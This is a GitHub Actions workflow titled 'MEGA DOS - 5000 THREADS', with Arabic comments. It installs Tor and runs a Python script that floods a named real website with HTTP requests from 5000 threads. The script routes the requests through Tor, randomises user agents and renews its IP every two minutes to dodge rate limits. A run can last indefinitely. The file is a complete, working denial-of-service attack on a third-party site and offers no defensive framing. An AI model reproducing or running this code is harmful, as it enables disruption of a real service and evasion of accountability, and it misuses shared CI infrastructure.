name: 💀 MEGA DOS - 5000 THREADS

on:
  workflow_dispatch:
    inputs:
      duration:
        description: 'المدة بالدقائق (0 = لا نهائي)'
        required: true
        default: '300'

jobs:
  mega_attack:
    runs-on: ubuntu-latest
    timeout-minutes: 999999
    
    steps:
      - name: Install dependencies
        run: |
          sudo apt update
          sudo apt install -y tor
          pip3 install requests[socks] fake_useragent
          
      - name: 🔥 MEGA DOS - TOR + CURL
        run: |
          cat > attack.py << 'EOF'
          import time
          import random
          import requests
          import subprocess
          import threading
          from fake_useragent import UserAgent
          
          # إعدادات
          TARGET = "https://flixtn.com"
          DURATION_MINUTES = ${{ github.event.inputs.duration }}
          THREADS = 5000
          
          # إحصائيات
          stats = {"total": 0, "success": 0, "failed": 0, "blocked": 0}
          stats_lock = threading.Lock()
          running = True
          start_time = time.time()
          
          # تشغيل Tor
          def start_tor():
              try:
                  subprocess.run(["sudo", "systemctl", "start", "tor"], check=False)
                  time.sleep(5)
                  print("✅ Tor started")
              except:
                  print("⚠️ Tor warning")
          
          # تجديد IP
          def renew_tor():
              try:
                  subprocess.run(["sudo", "systemctl", "reload", "tor"], check=False)
                  time.sleep(2)
                  print("🔄 IP renewed")
              except:
                  pass
          
          # هجوم عبر Tor
          def attack(worker_id):
              global running
              session = None
              ua = UserAgent()
              
              while running:
                  try:
                      if session is None:
                          session = requests.Session()
                          session.proxies = {
                              'http': 'socks5h://127.0.0.1:9050',
                              'https': 'socks5h://127.0.0.1:9050'
                          }
                      
                      headers = {'User-Agent': ua.random}
                      resp = session.get(TARGET, timeout=8, headers=headers)
                      
                      with stats_lock:
                          stats["total"] += 1
                          if resp.status_code == 200:
                              stats["success"] += 1
                          elif resp.status_code == 429:
                              stats["blocked"] += 1
                          else:
                              stats["failed"] += 1
                      
                  except:
                      with stats_lock:
                          stats["total"] += 1
                          stats["failed"] += 1
                      session = None
                  
                  time.sleep(random.uniform(0.05, 0.2))
          
          # طباعة الإحصائيات
          def printer():
              global running
              last_total = 0
              
              while running:
                  time.sleep(1)
                  elapsed = time.time() - start_time
                  
                  with stats_lock:
                      total = stats["total"]
                      success = stats["success"]
                      failed = stats["failed"]
                      blocked = stats["blocked"]
                      rps = total - last_total
                      last_total = total
                  
                  if DURATION_MINUTES > 0 and elapsed >= DURATION_MINUTES * 60:
                      running = False
                      print("\n⏰ Time limit reached")
                      break
                  
                  mins = int(elapsed // 60)
                  secs = int(elapsed % 60)
                  print(f"[{mins:02d}:{secs:02d}] Total: {total:>6,} | OK: {success:>5,} | 429: {blocked:>5,} | RPS: {rps:>3}")
          
          print("="*50)
          print("💀 MEGA DOS - 5000 THREADS + TOR")
          print(f"Target: {TARGET}")
          print(f"Threads: {THREADS}")
          print(f"Duration: {DURATION_MINUTES} minutes" if DURATION_MINUTES > 0 else "Duration: INFINITE")
          print("="*50)
          
          start_tor()
          
          # تشغيل الخيوط
          threads = []
          for i in range(THREADS):
              t = threading.Thread(target=attack, args=(i+1,))
              t.daemon = True
              t.start()
              threads.append(t)
          
          print(f"🔥 {THREADS} threads running...")
          
          # تشغيل عداد الإحصائيات
          printer_thread = threading.Thread(target=printer)
          printer_thread.daemon = True
          printer_thread.start()
          
          # تجديد IP كل دقيقتين
          last_renew = time.time()
          while running:
              time.sleep(30)
              if time.time() - last_renew > 120:
                  renew_tor()
                  last_renew = time.time()
          
          # انتظار
          for t in threads:
              t.join(timeout=0.5)
          
          # النتيجة النهائية
          elapsed = time.time() - start_time
          print("\n" + "="*50)
          print("FINAL STATISTICS:")
          print(f"  Time: {int(elapsed//60)}m {int(elapsed%60)}s")
          print(f"  Total: {stats['total']:,}")
          print(f"  Success: {stats['success']:,}")
          print(f"  Failed: {stats['failed']:,}")
          print(f"  Blocked (429): {stats['blocked']:,}")
          if stats['total'] > 0:
              print(f"  Success rate: {stats['success']/stats['total']*100:.1f}%")
              print(f"  Avg RPS: {stats['total']/elapsed:.1f}")
          print("="*50)
          EOF
          
          python3 attack.py
